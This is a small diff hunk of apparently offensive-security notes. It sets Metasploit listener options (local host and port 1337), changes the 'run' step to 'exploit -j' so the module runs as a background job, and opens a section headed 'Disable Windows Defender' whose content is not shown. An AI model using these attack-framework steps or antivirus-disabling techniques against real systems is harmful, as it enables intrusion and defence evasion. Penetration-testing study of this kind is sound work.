@@ -59,9 +59,9 @@ set lhost 192.x.x.x
 ``` msfconsole
 set lport 1337
 ```
-- Run
+- Exploit
 ``` msfconsole
-run 
+exploit -j
 ```
 ## Disable Windows Defender
 ``` powershell
